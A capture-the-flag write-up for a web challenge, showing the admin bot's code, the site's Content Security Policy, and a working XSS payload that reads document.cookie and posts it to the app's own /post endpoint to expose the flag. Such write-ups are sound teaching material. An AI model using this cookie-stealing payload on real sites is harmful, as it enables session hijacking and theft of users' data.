# Blogspot
Category: Web | 425pts

## Challenge Description
> Jaga created an internal social media platform for the company, can you leak anyone's information?

## Analysis
Glancing through the source code provided and challenge website, we can guess that this challenge is about Cross-Site Scripting (XSS) attacks, more specifically reflected XSS, for the following reasons:
- There is an admin bot with the flag in its cookies that visits the posts you wrote (and hence control) everytime you submit a new post  
	<details>
	<summary>Relevant code from admin bot</summary>

	```js
	export const viewPosts = async () => {
		try {
			const browser = await puppeteer.launch(browser_options);
			let context = await browser.createIncognitoBrowserContext();
			let page = await context.newPage();

			let token = await sign({ username: 'admin' });
			await page.setCookie({
				name: "session",
				'value': token,
				domain: "127.0.0.1",
			});
			await page.setCookie({
				name: "flag",
				'value': "REDACTED",
				domain: "127.0.0.1",
			});
			await page.goto('http://127.0.0.1:1337/blog', {
				waitUntil: 'networkidle2',
				timeout: 8000
			});
			await browser.close();
		} catch(e) {
			console.log(e);
		}
	};
	```
	</details>

<br>
<br>
However, at the same time, there is a content security policy we have to take note of:
```js
app.use(function (req, res, next) {
	res.setHeader(
	  'Content-Security-Policy',
	  "default-src 'self'; script-src 'unsafe-inline' 'self' https://cdnjs.cloudflare.com; style-src-elem 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; connect-src 'self';"
	);
	next();
  });
```

## Solution
We can use the following payload as a post to get the flag:
```js
qqq<script>xhr4=new XMLHttpRequest();var url4='/post';var a=document.cookie;xhr4.open('POST',url4,true);xhr4.setRequestHeader('Content-Type','application/json');var data=JSON.stringify({"title":"here","content":a});xhr4.send(data);</script>
```

## Explanation
Upon loading the page, the bot runs the script and sends a POST request to the `/post` endpoint with the flag in the body. The flag is then displayed on the page.

## Flag
`STF22{s1mpl3_p0stxSs:)}`